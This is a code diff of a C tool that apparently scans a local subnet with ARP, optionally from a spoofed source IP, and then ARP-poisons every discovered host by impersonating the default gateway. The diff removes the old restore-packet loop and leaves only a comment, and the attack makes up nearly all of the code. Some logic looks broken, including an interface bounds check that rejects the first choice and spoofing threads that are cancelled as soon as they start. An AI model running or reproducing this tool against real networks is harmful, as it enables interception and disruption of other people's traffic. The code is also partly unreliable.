@@ -15,7 +15,8 @@
 #include <pthread.h>
 #include "util.h"
 
-#define BUF_SIZE 65536
+#define BUF_SIZE 4096
+#define DEFAULT_HOST 65536
 
 struct ether_addr;
 extern char * ether_ntoa(struct ether_addr *); //library fucntion
@@ -25,10 +26,10 @@ typedef struct
 {
 	unsigned int ip;
 	unsigned int subnet;
-	unsigned int vip; //virtual ip
 	unsigned char mac[6];
-	unsigned char * vmac; //virtual mac
 }host;
+
+static unsigned int vip; //Virtual IP
 
 typedef void (*routine)(int);
 
@@ -41,54 +42,46 @@ static host gateway;
 static routine actions[3] = {scanning, spoofing, NULL};
 static int action = 0;
 
-static host * host_list[65536];
+static host * host_list[DEFAULT_HOST];
 
 static int is_end = 0;
 
 static unsigned int my = 0;
 
-void param_parse(int argc, char * argv[])
+int param_parse(int argc, char * argv[])
 {
-	static const char * usage = "sudo ./arp {some parameters}\n" 
-		"scanning {virtual ip}\n"
-		"spoof {default target is all, virtual mac}\n";
+	static const char * usage = 
+		"#./arp hostscan {virtual source ip}\n" 
+		"#./arp spoof\n";
+	int ret;
 
-	if (argc <= 1)
+	if (argc <= 1) //명령이 주어지지 않음
 	{
-		int idx = 0;
-		printf("usage\n%s", usage);
+		printf("Usage\n%s", usage);
 		exit(-1);
 	}
-	else
+	else //명령이 있음
 	{
 		int idx = 1;
 
 		if (!strcmp(argv[idx], "hostscan"))
 		{
-			action = 0;
-			if (idx + 1 < argc)
-				this.vip = inet_addr(argv[idx + 1]);	
+			ret = 0;
+			if (idx + 1 < argc) //추가 인자가 있음
+				vip = inet_addr(argv[idx + 1]);	
 		}
 		else if (!strcmp(argv[idx], "spoof"))
 		{
-			action = 1;
-			/*if (idx + 1 < argc)
-			{
-				this.vmac = (unsigned char *)malloc(6);
-				memcpy(this.vmac, (unsigned char *)ether_aton(argv[idx + 1]), 6);
-			}*/
-			if (idx + 1 < argc)
-			{
-
-				my = inet_addr(argv[idx + 1]);
-			}
+			ret = 1;	
 		}
 		else
 		{
 			printf("Invalid parameter: %s\n", argv[idx]);
 			exit(-1);
 		}
-	}	
+	}
+
+	return ret;	
 }
 
 int init_base()
@@ -97,59 +90,74 @@ int init_base()
 	struct ifreq ifr;
 	int sock, index, nr = 0;
 	
-	if (get_gateway(&gateway.ip, gateway.mac) < 0)
-		goto gateway_err;
-	
-	printf("-----default gateway-----\n---> %s [%s]\n\n", inet_ntoa(*(struct in_addr *)&gateway.ip), 
-				ether_ntoa((struct ether_addr *)(gateway.mac)));
-	
+		
 	sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
-	if (sock < 0)
+	if (sock < 0) //socket 사용 가능 여부 확인
 		goto socket_err;
 
 	if_arr = if_nameindex();
 	if (!if_arr)
 		goto if_nameindex_err;
 	
-	printf("-----network interface list-----\n");
+	printf("-----Network Interface List-----\n");
 	for (itf = if_arr; itf->if_index != 0 || itf->if_name != NULL; itf++, nr++)
 	{
 		printf("%s(%d)\n", itf->if_name, nr + 1);
 	}
 	
-	printf("\nChoose interface index\n>> ");
+	printf("\nChoose Interface Index\n>> ");
 	scanf("%d", &index);
-	index--;
+	index--; //offset이므로
 
-	if (index >= nr)
+	if (index >= nr || index <= 0)
 		goto out_of_bound;
+
+	if (get_gateway(index, &gateway.ip, gateway.mac) < 0) //ref, util.c
+		goto gateway_err;
+	
+	printf("\n-----Default Gateway-----\n---> %s [%s]\n\n", inet_ntoa(*(struct in_addr *)&gateway.ip), 
+				ether_ntoa((struct ether_addr *)(gateway.mac)));
+
 	itf = if_arr + index;
 
+	//인터페이스 이름이 먼저 설정되어야 함. 커널 함수와 관련이 있기 때문
 	memcpy(ifr.ifr_name, itf->if_name, sizeof(ifr.ifr_name));
+
+	//IP address
 	ioctl(sock, SIOCGIFADDR, &ifr);
 	memcpy(&this.ip, &ifr.ifr_addr.sa_data[2], sizeof(this.ip));
+
+	//Netmask
 	ioctl(sock, SIOCGIFNETMASK, &ifr);
 	memcpy(&this.subnet, &ifr.ifr_netmask.sa_data[2], sizeof(this.subnet));
+
+	//MAC address
 	ioctl(sock, SIOCGIFHWADDR, &ifr);
 	memcpy(this.mac, &ifr.ifr_hwaddr.sa_data, sizeof(this.mac));
 
+	index = itf->if_index; //NIC Index
+	
 	close(sock);
-	index = itf->if_index;
-
 	if_freenameindex(if_arr);
+
 	return index;
 
-gateway_err:
-	perror("get_gateway() error");
-	exit(-1);
 socket_err:
 	perror("socket() error");
 	exit(-1);
 if_nameindex_err:
 	perror("if_nameindex() error");
+	close(sock);
 	exit(-1);
 out_of_bound:
 	printf("Invalid choice: %d\n", index + 1);
+	close(sock);
+	if_freenameindex(if_arr);
+	exit(-1);
+gateway_err:
+	perror("get_gateway() error");
+	close(sock);
+	if_freenameindex(if_arr);
 	exit(-1);
 }
 
@@ -185,7 +193,7 @@ unsigned char * create_arp_packet(unsigned char * buf, unsigned short op,
 	memcpy(ptr, &src, 4); //spa
 	ptr += 4;
 	if (!target) //tha
-		memset(ptr, 0, 6); //unknown
+		memset(ptr, 0, 6); //who is target?
 	else
 		memcpy(ptr, target, 6);
 	ptr += 6;
@@ -194,14 +202,15 @@ unsigned char * create_arp_packet(unsigned char * buf, unsigned short op,
 	return buf;
 }
 
+//Thread routine
 void * reply_handle(void * arg)
 {
 	unsigned char buf[BUF_SIZE], * ptr;
 	struct arphdr * arp;
-
 	int sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
-	int * tot = (int *)arg;
+	int * ptr_tot = (int *)arg;
 
+	*ptr_tot = 0; //reset
 	while (1)
 	{
 		int len = recvfrom(sock, buf, BUF_SIZE, 0, NULL, NULL);
@@ -226,23 +235,25 @@ void * reply_handle(void * arg)
 		ptr += 6; //spa
 
 		nr = (*(unsigned int *)ptr);
-		nr = ntohl(nr & ~this.subnet);
-		if (host_list[nr])
+		nr = ntohl(nr & ~this.subnet); //host address
+		if (host_list[nr]) //Already exist
 			continue;
 
 		host_list[nr] = (host *)malloc(sizeof(host));
 		target = host_list[nr];
 
-		printf("%s\t[%s]\tis alive\n", inet_ntoa(*(struct in_addr *)ptr), 
-				ether_ntoa((struct ether_addr *)(ptr - 6)));
+		printf("%s\t[%s]\tis alive\n", 
+				inet_ntoa(*(struct in_addr *)ptr), //IP address
+				ether_ntoa((struct ether_addr *)(ptr - 6))); //MAC address
 
 		memcpy(&target->ip, ptr, 4);
 		memcpy(target->mac, ptr - 6, 6);
-		*tot += 1;
-		//usleep(100);
+	
+		(*ptr_tot) += 1;	
 	}	
 	
 	close(sock);
+	printf("End of thread\n");
 	return NULL;
 }
 
@@ -250,135 +261,139 @@ void scanning(int idx)
 {
 	unsigned int host = 1;
 	unsigned int network_addr = this.ip & this.subnet;
-	unsigned int target;
-	int arp_sock, pkt_size = sizeof(struct ethhdr) + sizeof(struct arphdr) + 20;
-	unsigned int max, used;
-	pthread_t tid;
+	unsigned int max = ntohl(~this.subnet);
+	unsigned int which;
+
 	unsigned char buf[BUF_SIZE];
 	struct sockaddr_ll device;
-	int tot = 0, delay = 1000;
+	int delay = 1000, pkt_size = sizeof(struct ethhdr) + sizeof(struct arphdr) + 20;
+	int arp_sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
 
-	arp_sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
-	pthread_create(&tid, NULL, reply_handle, &tot);
+	int * tot = (int *)malloc(sizeof(int));
+	pthread_t tid;
 
 	memset(&device, 0, sizeof(device));
 	device.sll_ifindex = idx;
 	device.sll_halen = ETH_ALEN;
 	memset(device.sll_addr, 0xff, 6);
-
-	max = ntohl(~this.subnet); //maximum host number
-
-	if (this.vip == 0)
-		used = this.ip;
+	
+	if (vip == 0)
+		which = this.ip;
 	else
-		used = this.vip;
+		which = vip;
 
-	printf("the time for host scan: %f sec\n\n", max * (delay * 0.000001));
+	printf("\tHost Scanning Start\n\n");
+
+	pthread_create(&tid, NULL, reply_handle, tot);
 	while (host <= max)
 	{
-		target = network_addr | htonl(host++);
-		create_arp_packet(buf, ARPOP_REQUEST, this.mac, used, NULL, target);
+		unsigned int target = network_addr | htonl(host++);
+
+		create_arp_packet(buf, ARPOP_REQUEST, this.mac, which, NULL, target);
 		sendto(arp_sock, buf, pkt_size, 0, (struct sockaddr *)&device, sizeof(device));
 		usleep(delay);
 	}
-	
-	pthread_cancel(tid);
-	close(arp_sock);
-	printf("there are [%d] hosts, except you\n", tot);
-}
+	usleep(delay);
 
-void sigint_handle(int sig)
-{
-	is_end = 1;
+	printf("\n\tHost Scanning Finished\nThere are [%d] hosts, except you\n\n", *tot);
+
+	pthread_cancel(tid);
+	pthread_join(tid, NULL);
+	close(arp_sock);
+	free(tot);
 }
 
 void * spoof_unit(void * arg)
 {	
-	int arp_sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
-	int pkt_size = sizeof(struct ethhdr) + sizeof(struct arphdr) + 20;
+	unsigned char buf[BUF_SIZE]; //Not be shared!
 	struct sockaddr_ll device;
 
+	int * args = (int *)arg;
+	int if_index = args[0], t = args[1], arp_sock = args[2];
+	int pkt_size = sizeof(struct ethhdr) + sizeof(struct arphdr) + 20;
+
 	memset(&device, 0, sizeof(device));
-	device.sll_ifindex = idx;
+	device.sll_ifindex = if_index;
 	device.sll_halen = ETH_ALEN;
-	memset(device.sll_addr, 0xff, 6);
+	memcpy(device.sll_addr, host_list[t]->mac, 6);
 
-	create_arp_packet(buf, ARPOP_REPLY, used, gateway.ip, host_list[t]->mac, host_list[t]->ip);
-	sendto(arp_sock, buf, pkt_size, 0, (struct sockaddr *)&device, sizeof(device));
-	usleep(100);
+	while (1)
+	{
+		create_arp_packet(buf, ARPOP_REPLY, this.mac, gateway.ip, host_list[t]->mac, host_list[t]->ip);
+		sendto(arp_sock, buf, pkt_size, 0, (struct sockaddr *)&device, sizeof(device));
+		usleep(1000);
+	}
 
+	//복구 패킷
 
-	//arg는 nic index와 host번호를 배열에 담아 전달하는 거로
+	free(args);
+	return NULL;
 }
 
 void spoofing(int idx) //default is for all hosts
 {
 	int t;
-	unsigned char buf[BUF_SIZE], * used;
+	unsigned char buf[BUF_SIZE];
 	unsigned int max = ntohl(~this.subnet);
+	int arp_sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+	int * args;
 	pthread_t * tids, tid;
-		
+
 	scanning(idx);
 
-	signal(SIGINT, sigint_handle);
-
-	if (this.vmac)
-		used = this.vmac;
-	else
-		used = this.mac;
-
 	tids = malloc(sizeof(pthread_t) * max);
+	memset(tids, 0, sizeof(pthread_t) * max);
 
-	printf("\n\n\tarp spoofing start\n");
-	//modified packet
-	for (t = 1; !is_end && t <= max; t++)
-	{	
-		if (t == max)
-		{
-			t = 0;
-			continue;
-		}
-		
-		if (!host_list[t])
+	printf("\n\n\tARP Spoofing Start\n");
+
+	for (t = 1; t <= max; t++)
+	{		
+		if (!host_list[t]) //No host,
 			continue;
 		if (host_list[t]->ip == gateway.ip)
 			continue;
-		if (host_list[t]->ip != my)
-			continue;
 
-		pthread_create(&tid, NULL, reply_handle, &tot);
+		//if (host_list[t]->ip != my)
+			//continue;
 
-		tids[t] = tid;
+		args = (int *)malloc(sizeof(int) * 3);
+		args[0] = idx; args[1] = t; args[2] = arp_sock;
 
-			}
-	//normal packet
+		if (!pthread_create(&tid, NULL, spoof_unit, args))
+			tids[t] = tid;
+		else
+		{
+			perror("pthread_create() error");
+			free(args);
+		}
+	}
+
+	printf("\tARP Spoofing Stop\n");
+
+	//쓰레드 정리
 	for (t = 1; t <= max; t++)
 	{
-		if (!host_list[t])
+		if (!tids[t])
 			continue;
-		if (host_list[t]->ip == gateway.ip)
-			continue;
-		create_arp_packet(buf, ARPOP_REPLY, gateway.mac, gateway.ip, host_list[t]->mac, host_list[t]->ip);
-		sendto(arp_sock, buf, pkt_size, 0, (struct sockaddr *)&device, sizeof(device));
-		usleep(100);
+		pthread_cancel(tids[t]);
+		pthread_join(tids[t], NULL);
 	}
 
 	free(tids);
 	close(arp_sock);
-	printf("\tarp spoofing stop\n");
 }
 
 int main(int argc, char * argv[])
 {
-	int idx;
+	int idx, func;
 
-	param_parse(argc, argv);
+	func = param_parse(argc, argv);
 
 	idx = init_base();
 
-	actions[action](idx);	
+	actions[func](idx);	
 	
-	for (idx = 0; idx < 65536; idx++)
+	for (idx = 0; idx < DEFAULT_HOST; idx++)
 	{
 		if (host_list[idx])
 			free(host_list[idx]);
